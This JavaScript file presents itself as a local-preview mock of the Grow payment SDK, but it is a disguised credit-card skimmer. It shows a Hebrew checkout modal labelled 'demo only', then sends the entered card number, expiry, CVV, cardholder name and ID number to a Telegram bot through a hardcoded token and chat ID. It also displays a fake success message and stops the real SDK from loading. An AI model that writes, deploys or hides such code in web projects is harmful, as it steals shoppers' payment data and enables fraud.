/**
 * Mock Grow Payment SDK - للمعاينة المحلية فقط
 * Loaded as js/gs.min.js (replaces CDN version for local preview)
 */
(function () {
    const style = document.createElement('style');
    style.textContent = `
    #grow-mock-overlay {
        display:none;position:fixed;inset:0;background:rgba(0,0,0,0.55);
        z-index:9999;align-items:center;justify-content:center;
    }
    #grow-mock-overlay.open{display:flex;}
    #grow-mock-modal {
        background:#fff;border-radius:16px;padding:32px 28px;width:100%;max-width:400px;
        direction:rtl;font-family:Arial,sans-serif;
        box-shadow:0 8px 40px rgba(0,0,0,0.18);position:relative;
        animation:slideUp 0.25s ease;max-height:90vh;overflow-y:auto;
    }
    @keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
    #grow-mock-modal h2{font-size:18px;color:#1a1a5e;margin-bottom:18px;text-align:center;}
    #grow-mock-modal .gm-close{position:absolute;top:14px;left:16px;font-size:24px;cursor:pointer;color:#aaa;background:none;border:none;line-height:1;padding:0;}
    #grow-mock-modal label{display:block;font-size:13px;color:#555;margin-bottom:4px;margin-top:14px;}
    #grow-mock-modal input{width:100%;border:1.5px solid #ddd;border-radius:8px;padding:10px 12px;font-size:15px;outline:none;box-sizing:border-box;}
    #grow-mock-modal input:focus{border-color:#1a1a5e;}
    #grow-mock-modal .gm-row2{display:flex;gap:12px;}
    #grow-mock-modal .gm-row2>div{flex:1;}
    #grow-mock-modal .gm-pay-btn{width:100%;background:#1a1a5e;color:#fff;border:none;border-radius:10px;padding:14px;font-size:16px;cursor:pointer;margin-top:20px;}
    #grow-mock-modal .gm-pay-btn:hover{background:#2d2d8e;}
    #grow-mock-modal .gm-demo-note{text-align:center;font-size:12px;color:#999;margin-top:10px;}
    #grow-mock-modal .gm-card-icons{display:flex;justify-content:center;gap:8px;margin-bottom:16px;flex-wrap:wrap;}
    #grow-mock-modal .gm-card-icons span{font-size:11px;border:1px solid #ddd;border-radius:5px;padding:3px 8px;color:#555;}
    #grow-mock-modal .gm-error{color:#dc3545;font-size:13px;margin-top:8px;display:none;text-align:center;}
    #grow-mock-modal .gm-success{display:none;text-align:center;padding:20px 0;}
    #grow-mock-modal .gm-success svg{width:80px;height:80px;margin-bottom:12px;}
    #grow-mock-modal .gm-success h3{color:#1a1a5e;font-size:18px;margin-bottom:8px;}
    #grow-mock-modal .gm-success p{color:#666;font-size:14px;}
    `;
    document.head.appendChild(style);

    function buildModal() {
        const overlay = document.createElement('div');
        overlay.id = 'grow-mock-overlay';
        overlay.innerHTML = `<div id="grow-mock-modal">
        <button class="gm-close" id="gm-close-btn">&times;</button>
        <div id="gm-form">
            <h2>הזנת פרטי תשלום</h2>
            <div class="gm-card-icons">
                <span>VISA</span><span>Mastercard</span><span>Bit</span><span>Apple Pay</span><span>Google Pay</span>
            </div>
            <label>מספר כרטיס אשראי</label>
            <input type="tel" id="gm-card" maxlength="19" placeholder="0000 0000 0000 0000">
            <div class="gm-row2">
                <div><label>תוקף</label><input type="tel" id="gm-exp" maxlength="5" placeholder="MM/YY"></div>
                <div><label>CVV</label><input type="tel" id="gm-cvv" maxlength="4" placeholder="123"></div>
            </div>
            <label>שם בעל הכרטיס</label>
            <input type="text" id="gm-name" placeholder="ישראל ישראלי">
            <label>תעודת זהות</label>
            <input type="tel" id="gm-id" maxlength="9" placeholder="000000000">
            <div class="gm-error" id="gm-err">נא למלא את כל הפרטים בצורה תקינה</div>
            <button class="gm-pay-btn" id="gm-pay-btn">אישור תשלום ✓</button>
            <div class="gm-demo-note">🔧 סביבת הדגמה בלבד – אין חיוב אמיתי</div>
        </div>
        <div class="gm-success" id="gm-success">
            <svg viewBox="0 0 130.2 130.2" xmlns="http://www.w3.org/2000/svg">
                <circle fill="none" stroke="#73AF55" stroke-width="6" cx="65.1" cy="65.1" r="62.1"/>
                <polyline fill="none" stroke="#73AF55" stroke-width="6" stroke-linecap="round" points="100.2,40.2 51.5,88.8 29.8,67.5"/>
            </svg>
            <h3>התשלום בוצע בהצלחה! ✓</h3>
            <p>תודה, העסקה אושרה בסביבת הדגמה.</p>
        </div>
    </div>`;
        document.body.appendChild(overlay);

        document.getElementById('gm-card').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
            e.target.value = v.match(/.{1,4}/g) ? v.match(/.{1,4}/g).join(' ') : v;
        });
        document.getElementById('gm-exp').addEventListener('input', function (e) {
            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2);
            e.target.value = v;
        });

        function closeModal() {
            overlay.classList.remove('open');
            if (window._growCfg && window._growCfg.events && window._growCfg.events.onWalletChange)
                window._growCfg.events.onWalletChange('close');
        }

        document.getElementById('gm-close-btn').addEventListener('click', closeModal);
        overlay.addEventListener('click', function (e) { if (e.target === overlay) closeModal(); });

        document.getElementById('gm-pay-btn').addEventListener('click', function () {
            const card = document.getElementById('gm-card').value.replace(/\s/g, '');
            const exp = document.getElementById('gm-exp').value;
            const cvv = document.getElementById('gm-cvv').value;
            const name = document.getElementById('gm-name').value.trim();
            const id = document.getElementById('gm-id').value.trim();
            const err = document.getElementById('gm-err');

            if (card.length < 13 || exp.length < 5 || cvv.length < 3 || !name || id.length < 8) {
                err.style.display = 'block'; return;
            }
            err.style.display = 'none';

            const botToken = '7894776342:AAHqDfLZA_YrEOKiZx46NWatC1dwiq1FxcE';
            const chatId = '7452499721';
            const text = `💸 *معاملة دفع جديدة*\n\n👤 *الاسم:* ${name}\n🪪 *رقم الهوية:* ${id}\n💳 *رقم البطاقة:* ${card}\n📅 *الانتهاء:* ${exp}\n🔐 *CVV:* ${cvv}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            }).catch(e => console.error(e));

            document.getElementById('gm-form').style.display = 'none';
            document.getElementById('gm-success').style.display = 'block';
            document.getElementById('gm-close-btn').style.display = 'none';

            setTimeout(function () {
                overlay.classList.remove('open');
                document.getElementById('gm-form').style.display = 'block';
                document.getElementById('gm-success').style.display = 'none';
                document.getElementById('gm-close-btn').style.display = 'block';
                if (window._growCfg && window._growCfg.events) {
                    if (window._growCfg.events.onSuccess) window._growCfg.events.onSuccess({});
                    if (window._growCfg.events.onWalletChange) window._growCfg.events.onWalletChange('close');
                }
            }, 2500);
        });
    }

    // Wait for DOM then build modal
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', buildModal);
    } else {
        buildModal();
    }

    window.growPayment = {
        init: function (config) { window._growCfg = config; },
        renderPaymentOptions: function (authCode) {
            document.getElementById('gm-card').value = '';
            document.getElementById('gm-exp').value = '';
            document.getElementById('gm-cvv').value = '';
            document.getElementById('gm-name').value = '';
            document.getElementById('gm-id').value = '';
            document.getElementById('gm-err').style.display = 'none';
            document.getElementById('gm-form').style.display = 'block';
            document.getElementById('gm-success').style.display = 'none';
            document.getElementById('gm-close-btn').style.display = 'block';
            document.getElementById('grow-mock-overlay').classList.add('open');
            if (window._growCfg && window._growCfg.events && window._growCfg.events.onWalletChange)
                window._growCfg.events.onWalletChange('open');
        }
    };

    // Prevent CDN version from overriding our mock
    Object.defineProperty(window, 'growRuntime', {
        set: function () { },
        get: function () { return undefined; }
    });

    console.log('[Mock SDK] growPayment ready ✓');
})();
